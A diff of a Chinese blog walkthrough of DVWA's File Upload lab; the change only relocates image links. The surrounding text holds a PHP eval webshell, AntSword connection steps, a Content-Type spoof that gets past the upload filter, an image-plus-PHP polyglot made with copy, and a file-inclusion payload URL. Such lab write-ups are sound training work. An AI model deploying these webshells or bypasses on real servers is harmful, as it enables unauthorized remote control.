@@ -15,7 +15,7 @@ tags:
 
 ## DVWA File Upload（文件上传）
 
-![DVWA 标志（文章封面）](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165331831.jpeg)
+![DVWA 标志（文章封面）](/images/blog/20251225165331831.jpeg)
 
 
 
@@ -99,17 +99,17 @@ if( isset( $_POST[ 'Upload' ] ) ) {
 <?php @eval($_POST['attack']) ?>
 ```
 
- ![File Upload 页面选中 1.php 上传，提示 ../../hackable/uploads/1.php successfully uploaded!](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165331832.png)
+ ![File Upload 页面选中 1.php 上传，提示 ../../hackable/uploads/1.php successfully uploaded!](/images/blog/20251225165331832.png)
 
 使用蚁剑连接一句话木马
 
-1. 启动AntSword应用后，在界面的任意空白区域点击鼠标右键，这时会出现一个菜单。在弹出的菜单中，选择「添加数据」选项。 ![屏幕截图 2024-05-11 104500](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165331833.png)
+1. 启动AntSword应用后，在界面的任意空白区域点击鼠标右键，这时会出现一个菜单。在弹出的菜单中，选择「添加数据」选项。 ![屏幕截图 2024-05-11 104500](/images/blog/20251225165331833.png)
 
-2. 进入到添加数据的页面，根据屏幕提示填写所需的信息。确保每一项必填内容都已正确无误地填写完毕，点击「测试连接」按钮，检查连接是否成功。 ![屏幕截图 2024-05-11 104740](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165331834.png)
+2. 进入到添加数据的页面，根据屏幕提示填写所需的信息。确保每一项必填内容都已正确无误地填写完毕，点击「测试连接」按钮，检查连接是否成功。 ![屏幕截图 2024-05-11 104740](/images/blog/20251225165331834.png)
 
-3. 填写完成后，点击页面中的「添加」按钮，这时候你刚刚输入的信息会被保存为一个新的Shell条目，并能在数据管理列表中看到它。 ![中国蚁剑的数据管理里新增一条 http://127.0.0.1/DVWA-master/... 的记录](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165331835.png)
+3. 填写完成后，点击页面中的「添加」按钮，这时候你刚刚输入的信息会被保存为一个新的Shell条目，并能在数据管理列表中看到它。 ![中国蚁剑的数据管理里新增一条 http://127.0.0.1/DVWA-master/... 的记录](/images/blog/20251225165331835.png)
 
-4. 接下来，双击这个新添加的Shell条目，系统将带你进入该Shell对应的文件管理界面，从而可以进一步操作和管理相关文件。 ![蚁剑文件列表打开 uploads 目录，1.php 大小 32 b（红框）](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165331836.png)
+4. 接下来，双击这个新添加的Shell条目，系统将带你进入该Shell对应的文件管理界面，从而可以进一步操作和管理相关文件。 ![蚁剑文件列表打开 uploads 目录，1.php 大小 32 b（红框）](/images/blog/20251225165331836.png)
 
 连接木马成功后，直接获取Webshell，可以在服务器上进行任意操作。
 
@@ -198,11 +198,11 @@ if( isset( $_POST[ 'Upload' ] ) ) {
 
 Medium级别限制上传文件类型只能为JPEG或PNG，同时限制文件大小不能超过100KB。这个时候再上传一句话木马，会提示上传失败。
 
- ![上传被拒：We can only accept JPEG or PNG images.](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165331837.png)
+ ![上传被拒：We can only accept JPEG or PNG images.](/images/blog/20251225165331837.png)
 
 2、使用Burp Suite抓取一句话木马文件上传的包，发现上传的PHP文件类型在包里。
 
- ![Burp 拦截 multipart 请求，红框 filename="1.php"](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165331838.png)
+ ![Burp 拦截 multipart 请求，红框 filename="1.php"](/images/blog/20251225165331838.png)
 
 修改1.php文件的文件类型为“image/png”，然后Foward。
 
@@ -210,11 +210,11 @@ Medium级别限制上传文件类型只能为JPEG或PNG，同时限制文件大�
 Content-Type: image/png; 
 ```
 
- ![同一请求里红框标出 Content-Type 被改成 image/png](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165331839.png)
+ ![同一请求里红框标出 Content-Type 被改成 image/png](/images/blog/20251225165331839.png)
 
 虽然我们上传的文件是PHP文件，但还是可以通过修改网页HTTP报文中文件类型，来绕过网页白名单检查。
 
- ![改包后上传成功，提示 ../../hackable/uploads/1.php successfully uploaded!](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165331840.png)
+ ![改包后上传成功，提示 ../../hackable/uploads/1.php successfully uploaded!](/images/blog/20251225165331840.png)
 
 ## High
 
@@ -306,19 +306,19 @@ getimagesize()函数，用于获取图像文件的大小以及相关信息。该
 
 1、我们可以准备一张图片和一句话木马的文件，通过 `copy` 命令将两个文件合并成一个文件。
 
- ![目录里并排的 muma.php 与 muma.png（图片马）](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165331841.png)
+ ![目录里并排的 muma.php 与 muma.png（图片马）](/images/blog/20251225165331841.png)
 
 ```
 copy muma.png/b + muma.php/a 1.png
 ```
 
- ![屏幕截图 2024-06-23 155102](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165331842.png)
+ ![屏幕截图 2024-06-23 155102](/images/blog/20251225165331842.png)
 
- ![010 Editor 里 muma.png 末尾追加 <?php @eval($_POST［'123'］);?>（红框）](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165331843.png)
+ ![010 Editor 里 muma.png 末尾追加 <?php @eval($_POST［'123'］);?>（红框）](/images/blog/20251225165331843.png)
 
 文件上传成功
 
- ![上传 1.png 成功，提示 ../../hackable/uploads/1.png successfully uploaded!](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165331844.png)
+ ![上传 1.png 成功，提示 ../../hackable/uploads/1.png successfully uploaded!](/images/blog/20251225165331844.png)
 
 2、但此时2.jpg是个图像文件，无法使用蚁剑连接。我们需要将2.jpg作为php文件执行，使用文件包含漏洞( File Inclusion)，构造payload。
 
@@ -326,7 +326,7 @@ copy muma.png/b + muma.php/a 1.png
 http://dvwa/vulnerabilities/fi/?page=file:///D:\phpstudy_pro\WWW\DVWA-master\hackable\uploads\1.png
 ```
 
- ![用 file:/// 包含上传的 1.png，页面输出一堆乱码，说明 PHP 被当文本读取](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165331845.png)
+ ![用 file:/// 包含上传的 1.png，页面输出一堆乱码，说明 PHP 被当文本读取](/images/blog/20251225165331845.png)
 
 ## Impossible
 
